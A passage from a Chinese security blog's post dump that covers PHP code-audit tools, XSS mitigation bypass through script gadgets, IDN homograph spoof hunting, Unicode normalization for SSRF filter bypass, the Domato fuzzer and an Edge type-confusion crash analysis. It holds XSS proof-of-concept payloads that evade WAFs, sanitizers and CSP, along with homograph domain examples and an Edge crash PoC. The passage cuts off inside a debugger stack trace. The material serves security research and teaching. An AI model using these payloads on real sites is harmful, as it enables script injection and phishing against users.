控制流分析在2012年，Dahse J等人设计了RIPS，该工具引入AST进行数据流与控制流分析，结合过程内与过程间的分析得到审计结果，相对危险函数匹配的方式来说误报率少了很多，但是同样的也增加了开销。RIPS初始的版本开放源代码，而后闭源进行商业化。 3.4 基于图的分析基于图的分析是对控制流分析的一个改进，其利用CFG的特性和图计算的算法，一定程度上简化了计算，比较有代表性的是微软的Semmle QL和NDSS 2017年发表的文章Efficient and Flexible Discovery of PHP Application Vulnerabilities。 3.5 灰盒分析基于控制流的分析开销较大，于是有人提出了基于运行时的分析方式，对代码进行Hook，当执行到危险函数时自动回溯输入，找到输入并判断是否可用。 这种方式解决了控制流分析实现复杂、计算路径开销大的问题，在判断过滤函数上也有一定的突破，但是灰盒的方式并不一定会触发所有的漏洞。fate0师傅开发的prvd就是基于这种设计思路。 4. 参考资料 [1] RIPS https://github.com/ripsscanner/rips [2] prvd https://github.com/fate0/prvd [3] PHP运行时漏洞检测 http://blog.fatezero.org/2018/11/11/prvd/ [4] Cobra https://github.com/FeeiCN/cobra [5] Semmle QL https://github.com/Semmle/ql [6] Vulnerability hunting with Semmle QL https://blogs.technet.microsoft.com/srd/2018/08/16/vulnerability-hunting-with-semmle-ql-part-1/ [7] Backes M , Rieck K , Skoruppa M , et al. Efficient and Flexible Discovery of PHP Application Vulnerabilities[C]&#x2F;&#x2F; IEEE European Symposium on Security &amp; Privacy. IEEE, 2017. [8] Dahse J. RIPS-A static source code analyser for vulnerabilities in PHP scripts[J]. Retrieved: February, 2010, 28: 2012. [9] awesome static analysis https://github.com/mre/awesome-static-analysis 5. 结语在学习自动化审计的过程中做了一点整理，于是形成了这篇文章，水平有限，这篇文章讲得也比较浅。之后有机会再就各个技术的细节做进一步分析，不当之处还请各位师傅不吝指出。","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[{"name":"自动化","slug":"自动化","permalink":"https://blog.lyle.ac.cn/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"基于Gadgets绕过XSS防御机制","slug":"bypass-xss-mitigation-via-gadgets","date":"2019-02-27T01:49:17.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2019/02/27/bypass-xss-mitigation-via-gadgets/","link":"","permalink":"https://blog.lyle.ac.cn/2019/02/27/bypass-xss-mitigation-via-gadgets/","excerpt":"这篇文章是之前对CCS 2018 Code-Reuse Attacks for the Web Breaking Cross-Site Scripting Mitigations via Script Gadgets 的阅读笔记，最近整理资料发现放了挺久，于是稍做了一些整理和扩展发了出来。","text":"这篇文章是之前对CCS 2018 Code-Reuse Attacks for the Web Breaking Cross-Site Scripting Mitigations via Script Gadgets 的阅读笔记，最近整理资料发现放了挺久，于是稍做了一些整理和扩展发了出来。 0x00 背景本文主要考虑在可以注入任意HTML代码（富文本编辑器等应用）的条件下，利用JavaScript库中的一些代码片段（Gadget）来绕过常见的XSS防御机制，包括WAF、浏览器的XSS Filter、HTML Sanitizers、Content Security Policy等。 其中WAF考虑对请求值和返回值进行处理的正则匹配型或者字符匹配型WAF，HTML Sanitizers是则指DOMPurify这种基于DOM解析的XSS过滤器，Content Security Policy则主要考虑启用unsafe-eval或strict-dynamic的情况。 0x01 简单例子和二进制攻击中的Gadget作用类似，本文中的Gadget是指可能被恶意利用的代码片段，下面以一个简单的例子来说明： 12var button = document.getElementById(&quot;mbutton&quot;);button.innerHTML = button.getAttribute(&quot;data-text&quot;); 在这段代码中，取出了Id为mbutton的元素，并将data-text的值赋到了该元素的innerHTML属性。这是一些库中为了实现类似Tooltip等效果常用的一种方式，但是在存在这种代码片段的时候，只要构造如下的元素，就可造成XSS攻击。 1&lt;button id=&quot;mbutton&quot; data-text=&quot;&lt;img src=x onerror=alert(/xss/)&gt;&quot;&gt;a&lt;/button&gt; 0x02 Gadget分类论文中把可利用的Gadget分为几类，具体如下： 字符串操作这种Gadget主要是指对字符串的操作，一个字符串在经过操作后可能变为造成攻击的字符。 例如Polymer中的一段代码dash.replace(/-[a-z]/g, (m) =&gt; m[1].toUpperCase())，这段代码会把以连字符构成的字符串变为大写，例如像inner-h-t-m-l这种字符串处理后会变成innerHTML。大部分WAF是对请求值和返回值做匹配，而此时传入的是inner-h-t-m-l而不是innerHTML，那么就有可能造成绕过。 元素创建这种Gadget是像document.createElement(input) document.createElement(&quot;script&quot;) jQuery(&quot;&lt;&quot; + tag + &quot;&gt;&quot;) jQuery.html(input) 这种直接创建的标签甚至script的代码片段。当输入一定程度可控时，则可利用这种Gadget。 函数创建这种Gadget是指创建函数的代码段，比如Underscore.js中发现的一段代码： 12345source = &quot;var __t,__p=&#x27;&#x27;,__j=Array.prototype.join,&quot; +&quot;print=function()&#123;__p+=__j.call(arguments,&#x27;&#x27;);&#125;;\\n&quot; +source + &#x27;return __p;\\n&#x27;;var render = new Function(settings.variable || &#x27;obj&#x27;, &#x27;_&#x27;, source); 这种Gadget会间接执行构造的代码段，在一定条件下可造成攻击。 JavaScript代码执行这种Gadget主要是指类似eval这种会直接执行传入代码的代码段，例如： 12345eval(input);inputFunction.apply();node.innerHTML = &quot;prefix&quot; + input + &quot;suffix&quot;;scriptElement.src = input;node.appendChild(input); 表达式解析很多前端框架都提供了自己的模版引擎，有着丰富而强大的功能，这种Gadget就是框架中对模版表达式解析执行而造成的问题。例如Aurelia框架中可以用下面这段代码来触发一个代码执行。 123&lt;div ref=mes.bind=&quot;$this.me.ownerDocument.defaultView.alert(1)&quot;&gt;&lt;/div&gt; 0x03 例子例一论文中提及的例子很多，本文选取其中一个在jQuery Mobile中的Gadget来介绍： 1234567if (myId) &#123; ui.screen.attr(&quot;id&quot;, myId + &quot;-screen&quot;); ui.container.attr(&quot;id&quot;, myId + &quot;-popup&quot;); ui.placeholder .attr(&quot;id&quot;, myId + &quot;-placeholder&quot;) .html(&quot;&lt;!-- placeholder for &quot; + myId + &quot; --&gt;&quot;);&#125; 这个Gadget会提取data-role为popup的元素，获取其id中的内容，并调用.html，那么就可以构造一个如下的PoC： 123&lt;div data-role=popup id=&#x27;--&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#x27;&gt;&lt;/div&gt; 在这个PoC中，没有&lt;script&gt;这种会触发WAF的字符串，用到的属性也是data-role id等在HTML Sanitizer白名单中的元素，因此该PoC可以绕过大部分的防御手段。 例二虽然文中主要是针对unsafe-eval或strict-dynamic两种情况作了CSP的绕过，但是在有的情况下，不开启这两个选项也可实现执行，例如下面这个PoC： 1234567891011121314&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=content-security-policy content=&quot;object-src &#x27;none&#x27;;script-src https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js;&quot;&gt; &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div ng-app ng-csp&gt; &lt;div ng-focus=&quot;x=$event&quot; tabindex=0&gt;foo&lt;/div&gt; &lt;div ng-repeat=&quot;(key, value) in x.view&quot;&gt; &lt;div ng-if=key==&quot;window&quot;&gt;&#123;&#123; value.alert = [1].reduce(value.alert, &#x27;xss&#x27;) &#125;&#125;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 在模版内部中，Angular利用的是下面这个函数来完成调用，并不涉及eval等函数，因此在CSP没有开启unsafe-eval或strict-dynamic的情况下也可实现代码执行。 123function defaultHandlerWrapper(element, event, handler) &#123; handler.call(element, event);&#125; 0x04 Gadget发现对Gadget的查找，作者给出了两种方式，一种是手工查找，一种是基于污点分析的半自动化查找。手工查找本文不做赘述，主要讲基于污点分析的半自动化查找方式。 这种方式是基于2013年CCS的一篇名为25 Million Flows Later - Large-scale Detection of DOM-based XSS的文章。 该方式基于浏览器完成，先对eval document.write等敏感调用和innerHTML做了污点跟踪。然后爬取Alex Top 5000的网站，当发现数据流入了这些敏感调用，就尝试使用预置的一些攻击载荷尝试利用，若利用成功，则找到了一个Gadget。 当然这种方式也存在一些限制，比如作者只对第一级的链接做了分析和尝试、没有做用户交互和验证、在验证的时候没有考虑防御机制的绕过等。 0x05 参考链接 https://github.com/cure53/DOMPurify https://github.com/google/security-research-pocs/tree/master/script-gadgets https://queue.acm.org/detail.cfm?id=2663760 https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://blog.lyle.ac.cn/tags/XSS/"}]},{"title":"IDN Spoof漏洞自动化挖掘","slug":"idnfuzz","date":"2018-12-08T01:34:39.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2018/12/08/idnfuzz/","link":"","permalink":"https://blog.lyle.ac.cn/2018/12/08/idnfuzz/","excerpt":"0x00 背景国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。在域名系统中，国际化域名使用Punycode转写并以ASCII字符串储存。 同形异义攻击同形异义字是利用IDN中一些非拉丁字符语种的字母与拉丁字符非常相似，字面看很难区分的特性，找到对应的字符来实现钓鱼攻击。例如16ვ.com(U+10D5)、16ဒ.com (U+1012)、16ҙ.com (U+0499) 都在一定程度上和163.com有相似性，基于一些开放的https证书服务这些域名还能取得相应的证书，进一步增加钓鱼成功的可能性。","text":"0x00 背景国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。在域名系统中，国际化域名使用Punycode转写并以ASCII字符串储存。 同形异义攻击同形异义字是利用IDN中一些非拉丁字符语种的字母与拉丁字符非常相似，字面看很难区分的特性，找到对应的字符来实现钓鱼攻击。例如16ვ.com(U+10D5)、16ဒ.com (U+1012)、16ҙ.com (U+0499) 都在一定程度上和163.com有相似性，基于一些开放的https证书服务这些域名还能取得相应的证书，进一步增加钓鱼成功的可能性。 PunycodePunycode是RFC 3492标准设计的编码系统，用于把Unicode转换为可用的DNS系统的编码，比如16ҙ.com就会被转成xn–16-8tc.com，这在一定程度上可以防止IDN欺骗。 0x01 漏洞介绍在主流浏览器中，Chromium Project对这类漏洞关注度较多，甚至特别在安全类型中设置了对应的idn-spoof标签。 在chromium中维护了一个domain list，内置了一些较有知名度的域名，当有域名被认为和这些相似域名相似时，就会转成punycode显示。 其完整的检测算法可以在这里看到，对其详细的解释可以参考这篇文章。 总的来说，只要找到了一个字符的组合，可以通过Spoof Check，且在浏览器地址栏中显示的字形和top domain相似，就可以认为找到了一个IDN Spoof漏洞。 0x02 挖掘方法Unicode的字符较多，因此笔者考虑一定程度上将漏洞挖掘的过程自动化。最直接的思路是，将域名是否同形的问题转换为图像相似度的问题。 我们可以遍历所有的Unicode字符，使用浏览器地址栏渲染的字体生成其对应的图像，当其图像和域名中允许出现的ascii字符相似度较高时，则认为是可能造成Spoof的字符。 在这里笔者使用了感知哈希算法作为图像相似度的计算的方式，其大致步骤如下： 将图像缩小至相同尺寸：用于去除图像的细节，保留结构等基本信息 简化色彩：将缩小后的图像转为64级灰度，减少颜色带来的影响 计算平均值：计算所有像素的灰度平均值 比较像素的灰度：将每个像素的灰度，与平均值进行比较，记录结果 计算Hash值：将上一步的结果组合在一起构成一个整数作为图片的指纹 在获取到Unicode字符图片对应的Hash值后，使用计算汉明距离的方式计算两个图片的距离，就可以得到较为相似的字符列表了。 当找到符合条件的字符后，则找到包含该字符的域名，替换该字符进行测试，检测其是否能通过Spoof Check。这里直接使用Chrome测试不太方便，这里笔者抽取了其中部分代码形成独立的脚本进行测试。 另外对一些特别的字符，如 / &#x2F; ? &#x2F; . &#x2F; # 等，则构造包含对应字符的URL进行测试。 通过图像相似度和Spoof Check的测试后，最后进行人工的确认，如确实是可能造成Spoof的字符，则认为是漏洞并报告。 0x03 挖掘结果经测试，笔者成功找到了 crbug.com/904325 、 crbug.com/904627 等尚未修复的Spoof漏洞。 0x04 参考资料 https://en.wikipedia.org/wiki/Internationalized_domain_name https://www.unicode.org/faq/idn.html https://xlab.tencent.com/en/2018/11/13/cve-2018-4277/ https://en.wikipedia.org/wiki/IDN_homograph_attack https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e https://en.wikipedia.org/wiki/Perceptual_hashing Gontmakher A . The Homograph Attack[J]. Communications of the Acm, 2002, 45(2):128.","categories":[{"name":"Misc","slug":"Misc","permalink":"https://blog.lyle.ac.cn/categories/Misc/"}],"tags":[{"name":"Unicode","slug":"Unicode","permalink":"https://blog.lyle.ac.cn/tags/Unicode/"}]},{"title":"Unicode等价性浅谈","slug":"unicode-normalization","date":"2018-10-29T08:56:53.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2018/10/29/unicode-normalization/","link":"","permalink":"https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/","excerpt":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。","text":"做SSRF测试的时候，常提到用类似 ａ 字符来bypass过滤器，之前没有做深究，偶然的一次机会，发现bａidu.com(\\uff41)能跳转到百度，但是bаidu.com(\\u0430)会被认为是一个新的IDN域名，并不指向baidu.com。 先在浏览器中打开工具调试，发现第一个case在HTTP包中的Host字段的值是baidu.com，那么应该是先处理过再发送的请求。 想到了其中可能会有编码转换，简单看了一下IDN的RFC没有找到有价值的信息，于是开始找源码，以idna为关键字在WebKit的源码中找到相关函数 uidna_nameToUnicode ，在Chromium中也找到这个函数。 顺着关键字找到icu标准的实现，其在官方网站上很清楚的给出了转换的demo和浏览器normalize的demo，那么使用其进行测试。 bａidu.com测试结果入下： bаidu.com测试结果入下： 从上面这个结果可以看到\\uff41在某些模式下会被转换，而\\u0430在所有模式下都不会被转换，那么到这里这个问题已经有一个初步的答案了，第一个case被normalize转换为ascii，所以能正常解析。第二个case不会被转换，被做为unicode处理，所以会访问IDN域名。 但是这个答案还不够清晰，于是继续顺着线索找到unicode转换的标准。标准中提到，两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 和ａ(\\uff41)在某些字体下看起来可能相同，15和⑮(\\u246e)其表示的数学意义可能相同，所以这两种字符都有其相应的等价性，这种等价性是由人为规定的。更具体的说明可以参考wiki。 转换组成字符的方式有 Normalization Form C 和 Normalization Form KC 两种，它们之间的区别取决于生成的文本是否与原始非标准化文本等效，其中K用于表示兼容性。同理，分解组成字符的方式也有Normalization Form D 和 Normalization Form KD 两种。那么NFC和NFD的区别是什么呢，举例来说，Å(\\u212B)用NFD进行normalize，会变为Å(\\u0041\\u030a)，而NFC处理后则是Å(\\u00c5)。在normalize的时候，会检测字符是否在NFC表中，如果在则进行对应的转换算法。回到之前的问题，\\uff41会被normalize，而\\u0430不被normalize，在请求时因为其中包含unicode字符，所以会被认为是IDN域名。 到此为止，开头的问题已经基本清楚了。在接下来，想构造字符对应的等效码表，来为平时的测试服务。以简单考虑，这里不对icu的代码做深究，一个简单的想法是，对所有字符遍历一次，寻找normalize后相等的字符即可。那么一个简单的获取可打印ascii字符的等效字符的脚本如下： 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-import jsonfrom unicodedata import normalizedef main(): debug = False tables = &#123;&#125; for i in range(1, 0x10000): src = unichr(i) dst = normalize(&#x27;NFKC&#x27;, src)[0] try: if ord(dst) &lt; 128 and dst != src: if debug: print(&quot;%s (\\\\u%s) -- normalize --&gt; %s (\\\\x%s)&quot; % ( src, hex(i)[2:].rjust(4, &#x27;0&#x27;), dst, hex(dst.charAt(0))[2:] )) if dst in tables: tables[dst].append(src) else: tables[dst] = [src] except Exception as e: print(repr(e)) with open(&quot;nfctable.txt&quot;, &quot;wb&quot;) as fh: json.dump(tables, fh)if __name__ == &#x27;__main__&#x27;: main()","categories":[{"name":"Misc","slug":"Misc","permalink":"https://blog.lyle.ac.cn/categories/Misc/"}],"tags":[{"name":"Unicode","slug":"Unicode","permalink":"https://blog.lyle.ac.cn/tags/Unicode/"}]},{"title":"Domato - A DOM Fuzzer","slug":"2017-9-27-domato-dom-fuzzer","date":"2017-09-27T01:31:40.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2017/09/27/2017-9-27-domato-dom-fuzzer/","link":"","permalink":"https://blog.lyle.ac.cn/2017/09/27/2017-9-27-domato-dom-fuzzer/","excerpt":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML&#x2F;CSS&#x2F;JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库","text":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML&#x2F;CSS&#x2F;JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库 0x01 代码代码主要完成根据语法生成代码的功能，主要的代码是generator.py和grammar.py，另外的都是语法文件。 语法语法文件是domato的一个重要的部分，这部分作者提到的产生方式为两步。首先从Chrome的源文件中抽取出.idl文件，然后从Chrome的测试文件中提取出了一些常见的HTML和CSS语法。在提取出这些属性之后，还有很大范围的人工的改动，使得这些特征更容易触发bug。 完成后，作者并没有使用常见的json或者xml来定义，而是自己自定义了一种语法格式。其基本的语法是这样的： 1&lt;symbol&gt; = a mix of constants and &lt;other_symbol&gt;s 每一条语法规则都包含一个左值和一个右值，左值是一个符号，右值是符号&#x2F;常量及其组合。在生成样本时，右值都会递归的展开。 一个最简单的例子如下 1234&lt;cssrule&gt; = &lt;selector&gt; &#123; &lt;declaration&gt; &#125;&lt;selector&gt; = a&lt;selector&gt; = b&lt;declaration&gt; = width:100% 这里可能生成的样本就是 a &#123; width:100% &#125; 或者 b &#123; width:100% &#125; 这里在定义symbol的同时还可以定义一些附加的属性，比如 12&lt;selector p=0.9&gt; = a&lt;selector p=0.1&gt; = b 这里表示a出现的概率为0.1，如果不特别声明，则概率是相差不多的 代码语法用于生成代码的语法和普通的语法相差不大，但是引入了更多的规则来使得可以生成更灵活的脚本。还是看作者给出的例子 1234567!varformat fuzzvar%05d!lineguard try &#123; &lt;line&gt; &#125; catch(e) &#123;&#125;!begin lines&lt;new element&gt; = document.getElementById(&quot;&lt;string min=97 max=122&gt;&quot;);&lt;element&gt;.doSomething();!end lines 调用脚本生成一个5行的样本，得到的结果为 12345try &#123; var00001 = document.getElementById(&quot;hw&quot;); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00002 = document.getElementById(&quot;feezcqbndf&quot;); &#125; catch(e) &#123;&#125;try &#123; var00002.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125; 写一个代码的语法规则要注意的是下面这些点： 每一行都由!begin lines和!end lines包裹 这里用了&lt;new element&gt;而不是&lt;element&gt;，表示生成了一个变量 generator.pygenerator.py是主文件，其调用了grammar.py作为库，另外包含一些辅助生成样本的函数，大概的逻辑流程如下： GenerateSamples read template and grammar files add html grammar &#x3D;&gt; html.txt import css grammar add js grammar &#x3D;&gt; js.txt import css grammar add css grammar &#x3D;&gt; css.txt GenerateNewSample with args (template html css js) AddHTMLIDs &#x3D;&gt; 随机生成一些html元素的id，用于js&#x2F;css GenerateHTMLElements &#x3D;&gt; 调用库生成html及css，保存相关信息 GenerateFunctionBody &#x3D;&gt; 根据之前保存的信息生成js代码 grammar.pygrammar.py实现了一个通用的语法库，也就是说除了该fuzzer，还适用于其他的生成的库。其大概流程如下： ParseFromString &#x3D;&gt; 读取文件 IncludeFromString &#x3D;&gt; 保存规则 SaveFunction ParseCodeLine ParseGrammarLine ParseTagAndAttributes NormalizeProbabilities &#x3D;&gt; 根据概率随机生成样本 GetCDF ComputeInterestingIndices 其调用也比较简单，一个简单的demo如下 12345from grammar import Grammarmy_grammar = Grammar()my_grammar.ParseFromFile(&#x27;input_file.txt&#x27;)result_string = my_grammar.GenerateSymbol(&#x27;symbol_name&#x27;) 这里就调用input_file.txt中的语法生成了symbol_name中的元素 0x02 参考链接 pj0 blog github","categories":[{"name":"Fuzz","slug":"Fuzz","permalink":"https://blog.lyle.ac.cn/categories/Fuzz/"}],"tags":[{"name":"Browser","slug":"Browser","permalink":"https://blog.lyle.ac.cn/tags/Browser/"}]},{"title":"CVE-2017-8496 Edge Type confusion","slug":"2017-8-14-cve-2017-8496","date":"2017-08-14T01:31:40.000Z","updated":"2023-04-06T02:11:31.962Z","comments":true,"path":"2017/08/14/2017-8-14-cve-2017-8496/","link":"","permalink":"https://blog.lyle.ac.cn/2017/08/14/2017-8-14-cve-2017-8496/","excerpt":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。","text":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。 1.2 Affect versionWindows 10 Enterprise 64-bit (OS version 1607, OS build 14393.1198)Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393. 1.3 Timeline01&#x2F;12&#x2F;2016 Advisory disclosed01&#x2F;12&#x2F;2016 +0 days Countermeasure disclosed01&#x2F;12&#x2F;2016 +0 days SecurityTracker entry created01&#x2F;12&#x2F;2016 +0 days VulnerabilityCenter entry assigned01&#x2F;13&#x2F;2016 +1 days VulnerabilityCenter entry created01&#x2F;14&#x2F;2016 +1 days VulDB entry created01&#x2F;17&#x2F;2016 +3 days VulnerabilityCenter entry updated01&#x2F;19&#x2F;2016 +2 days VulDB last update 2. Technical description and PoC2.1 Crash从Google Project Zero的报告中获取的PoC如下 123456789&lt;!-- saved from url=(0014)about:internet --&gt;&lt;script&gt;function go() &#123; window.addEventListener(&quot;DOMAttrModified&quot;, undefined); m.style.cssText = &quot;clip-path: url(#foo);&quot;;&#125;&lt;/script&gt;&lt;body onload=go()&gt;&lt;meter id=&quot;m&quot; value=&quot;a&quot; frame=&quot;below&quot;&gt; WinDBG attach到Edge上，运行PoC，发现Crash（注：这里用了一款Edge专用的辅助Debug的工具，可以比较方便的在命令行直接attach到进程上。） 12edgehtml!CAttrArray::PrivateFindInl+0xd6:00007ffa`3b9e04b6 41f644d00380 test byte ptr [r8+rdx*8+3],80h ds:00000003`0005ffbe=?? 可以看出，这里是引用了一个无效的指针，此时的调用栈如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960611:048&gt; k # Child-SP RetAddr Call Site00 00000013`84bfad60 00007ffa`3bbaccc9 edgehtml!CAttrArray::PrivateFindInl+0xd601 00000013`84bfad90 00007ffa`3bb1a68b edgehtml!CAttrArray::SetParsed+0x4902 00000013`84bfae00 00007ffa`3bb1c40c edgehtml!CssParser::RecordProperty+0x24b03 00000013`84bfae70 00007ffa`3bb1b10c edgehtml!CssParser::HandleSingleDeclaration+0x21c04 00000013`84bfaef0 00007ffa`3bae026b edgehtml!CssParser::HandleDeclaration+0x9c05 00000013`84bfaf20 00007ffa`3badedaa edgehtml!CssParser::Write+0x3b06 00000013`84bfaf60 00007ffa`3b93165c edgehtml!ProcessCSSText+0x11207 00000013`84bfafe0 00007ffa`3b94aae3 edgehtml!CStyle::SetCssText+0xbc08 00000013`84bfb020 00007ffa`3bc2ed85 edgehtml!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x7709 00000013`84bfb070 00007ffa`3af6c35b edgehtml!CFastDOM::CCSSStyleDeclaration::Profiler_Set_cssText+0x250a 00000013`84bfb0a0 00007ffa`3af34460 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x16b0b 00000013`84bfb180 00007ffa`3aed6d09 chakra!Js::LeaveScriptObject&lt;1,1,0&gt;::LeaveScriptObject&lt;1,1,0&gt;+0x1800c 00000013`84bfb1d0 00007ffa`3aed44ae chakra!Js::JavascriptOperators::CallSetter+0xa90d 00000013`84bfb270 00007ffa`3aed4be2 chakra!Js::JavascriptOperators::SetProperty_Internal&lt;0&gt;+0x4de0e 00000013`84bfb330 00007ffa`3aed4b1f chakra!Js::JavascriptOperators::OP_SetProperty+0xa20f 00000013`84bfb380 00007ffa`3af8c1fb chakra!Js::JavascriptOperators::PatchPutValueWithThisPtrNoFastPath+0x9f10 00000013`84bfb400 00007ffa`3aec1ca0 chakra!Js::ProfilingHelpers::ProfiledStFld&lt;0&gt;+0x1cb11 00000013`84bfb4d0 00007ffa`3aec6a50 chakra!Js::InterpreterStackFrame::OP_ProfiledSetProperty&lt;Js::OpLayoutT_ElementCP&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; const &gt;+0x7012 00000013`84bfb520 00007ffa`3aec4aa2 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x34013 00000013`84bfb5b0 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x14214 00000013`84bfb610 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e15 00000013`84bfb950 00000176`dcdc0fb2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x5516 00000013`84bfb9a0 00007ffa`3aff1393 0x00000176`dcdc0fb217 00000013`84bfb9d0 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9318 00000013`84bfba20 00007ffa`3aec0490 chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8319 00000013`84bfba80 00007ffa`3aec4f4d chakra!Js::InterpreterStackFrame::OP_CallI&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;+0x1101a 00000013`84bfbad0 00007ffa`3aec4b07 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d1b 00000013`84bfbb60 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x1a71c 00000013`84bfbbc0 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e1d 00000013`84bfbf00 00000176`dcdc0fba chakra!Js::InterpreterStackFrame::InterpreterThunk+0x551e 00000013`84bfbf50 00007ffa`3aff1393 0x00000176`dcdc0fba1f 00000013`84bfbf80 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9320 00000013`84bfbfd0 00007ffa`3af2c2ec chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8321 00000013`84bfc030 00007ffa`3af2b8b6 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x10422 00000013`84bfc120 00007ffa`3afd6259 chakra!Js::JavascriptFunction::CallRootFunction+0x4a23 00000013`84bfc190 00007ffa`3af31d41 chakra!ScriptSite::CallRootFunction+0xb524 00000013`84bfc230 00007ffa`3af2d8fc chakra!ScriptSite::Execute+0x13125 00000013`84bfc2c0 00007ffa`3bb3278d chakra!ScriptEngineBase::Execute+0xcc26 00000013`84bfc360 00007ffa`3bb326d8 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d27 00000013`84bfc3b0 00007ffa`3bb431f7 edgehtml!CJScript9Holder::ExecuteCallback+0x1828 00000013`84bfc3f0 00007ffa`3bb42fe7 edgehtml!CListenerDispatch::InvokeVar+0x1fb29 00000013`84bfc570 00007ffa`3bb310da edgehtml!CListenerDispatch::Invoke+0xdb2a 00000013`84bfc5f0 00007ffa`3bbc1602 edgehtml!CEventMgr::_InvokeListeners+0x2ca2b 00000013`84bfc750 00007ffa`3ba9a495 edgehtml!CEventMgr::_InvokeListenersOnWindow+0x662c 00000013`84bfc780 00007ffa`3ba99f23 edgehtml!CEventMgr::Dispatch+0x4052d 00000013`84bfca50 00007ffa`3bad00c2 edgehtml!CEventMgr::DispatchEvent+0x732e 00000013`84bfcaa0 00007ffa`3bb0296a edgehtml!COmWindowProxy::Fire_onload+0x14e2f 00000013`84bfcbb0 00007ffa`3bb01596 edgehtml!CMarkup::OnLoadStatusDone+0x37630 00000013`84bfcc70 00007ffa`3bb46d7f edgehtml!CMarkup::OnLoadStatus+0x11231 00000013`84bfcca0 00007ffa`3bb2859d edgehtml!CProgSink::DoUpdate+0x3af32 00000013`84bfd130 00007ffa`3bb29d70 edgehtml!GlobalWndOnMethodCall+0x24d33 00000013`84bfd230 00007ffa`593e1c24 edgehtml!GlobalWndProc+0x13034 00000013`84bfd2f0 